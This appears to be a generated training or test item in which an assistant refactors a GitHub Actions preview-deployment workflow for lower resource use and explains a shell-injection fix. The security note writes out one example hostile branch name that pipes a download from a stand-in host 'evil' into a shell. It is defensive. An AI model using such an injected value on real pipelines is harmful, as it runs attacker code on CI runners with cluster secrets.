@@ -1,0 +1,106 @@
+id: gen-12764612-00424-refactor
+category: refactor
+language: yaml
+patterns:
+- minimize-environments
+facts:
+- F-PREVIEW-ENV
+messages:
+- role: user
+  content: |
+    fix this
+
+    ```yaml
+    name: preview
+    on:
+      push:
+        branches-ignore: [main]
+
+    jobs:
+      deploy:
+        runs-on: ubuntu-latest
+        steps:
+          - uses: actions/checkout@v4
+          - uses: azure/setup-helm@v4
+          - name: kubeconfig
+            run: |
+              mkdir -p ~/.kube
+              echo "${{ secrets.KUBECONFIG }}" > ~/.kube/config
+          - name: deploy log pipeline
+            run: |
+              helm upgrade --install logpipe ./chart \
+                --namespace logs-${{ github.ref_name }} --create-namespace \
+                --set ingester.replicas=3 \
+                --set parser.replicas=3 \
+                --set kafka.replicas=3 \
+                --set elasticsearch.replicas=3 \
+                --set kibana.enabled=true \
+                --set image.tag=${{ github.sha }}
+    ```
+- role: assistant
+  content: |
+    ```yaml
+    name: preview
+    on:
+      pull_request:
+        types: [opened, synchronize, reopened, closed]
+
+    concurrency:
+      group: preview-${{ github.event.pull_request.number }}
+      cancel-in-progress: true
+
+    env:
+      NS: logs-pr-${{ github.event.pull_request.number }}
+
+    jobs:
+      deploy:
+        if: github.event.action != 'closed' && !github.event.pull_request.draft
+        runs-on: ubuntu-latest
+        steps:
+          - uses: actions/checkout@v4
+          - uses: azure/setup-helm@v4
+          - name: kubeconfig
+            env:
+              KUBECONFIG_DATA: ${{ secrets.KUBECONFIG }}
+            run: |
+              echo "$KUBECONFIG_DATA" > "$RUNNER_TEMP/kubeconfig"
+              chmod 600 "$RUNNER_TEMP/kubeconfig"
+              echo "KUBECONFIG=$RUNNER_TEMP/kubeconfig" >> "$GITHUB_ENV"
+          - name: deploy log pipeline
+            env:
+              IMAGE_TAG: ${{ github.event.pull_request.head.sha }}
+            run: |
+              helm upgrade --install logpipe ./chart \
+                --namespace "$NS" --create-namespace \
+                --set ingester.replicas=1 \
+                --set parser.replicas=1 \
+                --set kafka.replicas=1 \
+                --set elasticsearch.replicas=1 \
+                --set kibana.enabled=true \
+                --set image.tag="$IMAGE_TAG"
+
+      teardown:
+        if: github.event.action == 'closed'
+        runs-on: ubuntu-latest
+        steps:
+          - name: kubeconfig
+            env:
+              KUBECONFIG_DATA: ${{ secrets.KUBECONFIG }}
+            run: |
+              echo "$KUBECONFIG_DATA" > "$RUNNER_TEMP/kubeconfig"
+              chmod 600 "$RUNNER_TEMP/kubeconfig"
+              echo "KUBECONFIG=$RUNNER_TEMP/kubeconfig" >> "$GITHUB_ENV"
+          - name: delete preview namespace
+            run: kubectl delete namespace "$NS" --ignore-not-found --wait=false
+    ```
+
+    **Green Notes**
+    - **Environments that do not exist** (reduces E, M): the old workflow created a full stack for every push to every branch and never removed it. Now there is one environment per open, non-draft PR, and it is deleted when the PR is merged or closed. In Green Metrics Tool measurements of an idle preview environment, trimming extra services saved only about 3% CPU energy per minute. The real saving is removing the hours that unused environments stay up, so the teardown job is the most important change.
+    - **One replica per service** (reduces M): nobody load-tests a preview, so 3 replicas of each service only reserve memory and cluster nodes. Check that the chart still works with `kafka.replicas=1` and `elasticsearch.replicas=1`. Some charts need the replication factor or the master node count set to 1 as well.
+    - **Concurrency group** (reduces E): a new push cancels a running deploy of the same PR instead of running several in parallel.
+
+    **Security fix:** `${{ github.ref_name }}` and the secret were pasted directly into shell scripts. A branch name like `x";curl evil|sh;"` would run as code, and slashes in branch names are not valid in namespace names anyway. The namespace now comes from the PR number, and values go through `env:`.
+
+    Branches without a PR no longer get a preview, and draft PRs are skipped until they are ready.
+verify:
+  static_only: GitHub Actions workflow YAML, needs a cluster and secrets
